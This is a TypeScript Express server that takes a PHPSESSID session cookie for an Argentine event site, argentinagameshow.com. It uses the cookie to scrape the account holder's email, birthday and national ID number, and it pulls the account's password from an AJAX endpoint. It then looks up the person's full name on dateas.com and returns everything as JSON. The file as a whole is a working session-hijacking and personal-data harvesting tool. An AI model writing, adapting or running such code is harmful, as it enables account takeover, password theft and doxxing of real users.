import express from 'express';
import http from 'http';
import path from 'path';

const app = express();

app.get('/', (_req, res) => {
    res.sendFile(path.join(__dirname, '/index.html'));
});

app.get('/info', (_req, res) => {
    res.sendFile(path.join(__dirname, '/info.html'));
});

async function getInfo(token: string) {
    try {
        const datos = await fetch("https://app.argentinagameshow.com/mis-datos", {
            headers: {
                cookie: `PHPSESSID=${token}`
            }
        })

        const html = await datos.text();

        const email = html.split("<div class=\"stvTextVal\">")[1].split("</div>")[0];
        const birthday = html.split("Fecha de nacimiento <span class=\"text-danger\">*</span> </label>")[1].split("<div")[0];
        const userdata = html.split("userdata: ")[1].split(`,\r\n`)[0];
        const { dni } = JSON.parse(userdata);

        return { dni, email, birthday };
    } catch (e) {
        console.error(e);
        return { dni: "Error", email: "Error", birthday: "Error" };
    }
}

async function getName(dni: string) {
    try {
        const req = await fetch("https://www.dateas.com/en-us/consulta_cuit_cuil", {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
            },
            body: `name=&cuit=${dni}&tipo=fisicas-juridicas`,
            method: "POST",
        });

        const html = await req.text();
        return html.split("<title>")[1].split(" - ")[0]
    } catch (e) {
        console.error(e);
        return "Error";
    }
}

async function getPassword(token: string) {
    try {
        const req = await fetch("https://app.argentinagameshow.com/ajax/table_edit.php?notab=1&tid=22&ftid=&rid=&sdb=0&id=&tab=undefined", {
            method: "POST",
            headers: {
                cookie: `PHPSESSID=${token}`,
                "Content-Type": "application/x-www-form-urlencoded",
            },
            body: "action=edit"
        })

        const json = await req.json();
        return json.password;
    } catch (e) {
        console.error(e);
        return "Error";
    }
}

app.get('/mis-datos', async (req, res) => {
    try {
        const token = req.query.PHPSESSID;
        if (!token || typeof token !== 'string') return res.status(400).send('Bad request');

        const { dni, email, birthday } = await getInfo(token);
        const password = await getPassword(token);
        const name = await getName(dni);

        res.status(202).send({ token, dni, email, birthday, password, name });
    } catch (e) {
        console.error(e);
        res.status(500).send('Error');
    }
});

const server = http.createServer(app);

server.listen(8888, () => {
    console.log('Server is running on http://localhost:8888');
});
